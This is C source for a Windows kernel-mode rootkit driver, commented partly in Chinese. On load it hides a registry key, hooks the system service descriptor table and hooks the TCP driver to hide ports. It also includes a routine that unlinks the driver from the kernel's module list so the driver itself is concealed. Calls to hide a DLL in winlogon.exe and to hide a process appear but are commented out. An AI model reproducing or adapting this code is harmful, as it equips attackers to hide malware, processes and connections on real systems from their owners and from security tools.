#include "ntddk.h"
#include "HideRegKey.h"
#include "HookSSDT.c"
#include "hideport.c"
#include "hidedll.h"
#include "DKOMPROC.h"

#define dbg(_X_) KdPrint((_X_))
#define Dbg(_X_) KdPrint((_X_))

typedef struct _MODULE_ENTRY {
   LIST_ENTRY ModuleListEntry;
   DWORD unknown1[4];
   DWORD base;
   DWORD DriverStart;
   DWORD unknown2;
   UNICODE_STRING DriverPath;
   UNICODE_STRING DriverName;
   //...
} MODULE_ENTRY, *PMODULE_ENTRY;

NTSTATUS DKOMHideCurrentDriver(IN PDRIVER_OBJECT pDriverObject)
{
	PMODULE_ENTRY pModuleEntry;
	 
	if (pDriverObject == NULL)
		return STATUS_UNSUCCESSFUL;
     
	//Dereference offset 0x14 within the driver object.
	//Now you should have the address of a module entry.
	pModuleEntry = *((PMODULE_ENTRY *)((DWORD)pDriverObject + 0x14));
	if(pModuleEntry != NULL)
	{
		KdPrint(("Hide Driver Name:%ws\n",  pModuleEntry->DriverName.Buffer));
		//将本驱动程序的相应目录项从项驱动程序目录中拆下来
		*((PDWORD)pModuleEntry->ModuleListEntry.Blink) = (DWORD)pModuleEntry->ModuleListEntry.Flink;
                 
		pModuleEntry->ModuleListEntry.Flink->Blink = pModuleEntry->ModuleListEntry.Blink;
		
		KdPrint(("DKOMHideCurrentDriver OK.\n"));
		
		return STATUS_SUCCESS;
	}
	
	return STATUS_UNSUCCESSFUL;
}

void DriverOnUnload( IN PDRIVER_OBJECT pDriverObject	)
{  
	Dbg("Driver in Unload!\n");
	 
	UnHideRegKey();              //取消隐藏注册表键
	UnhookSystemServiceCall();   //取消挂钩SSDT
	PortUnload();
}

NTSTATUS DriverEntry(
	 IN PDRIVER_OBJECT  pDriverObject,
	 IN PUNICODE_STRING regPath)
{
	NTSTATUS ntStatus;
	int i;

	KdPrint(("Driver is loaded!\n")); 

	KdBreakPoint();
	
	ntStatus = HideRegKey(HideKeyName);
	 
	if ( NT_SUCCESS(ntStatus) )
	{
		KdPrint(("HideRegKey Success!\n"));
	}
	
	if( NT_SUCCESS(ntStatus) )
	{
		ntStatus = HookSystemServiceCall();
		if( NT_SUCCESS(ntStatus) )
		{
			KdPrint(("HookSSDT Ok!\n"));
		}
	}

	//hide port
	InstallTCPDriverHook();
	
	//DKOMHideCurrentDriver(pDriverObject);
   
	//HideDll("winlogon.exe","test.dll");
   
	//DKOMPROCHIDE("WINLOGON.EXE");
	
	pDriverObject->DriverUnload   = DriverOnUnload;
   
	return STATUS_SUCCESS;
}
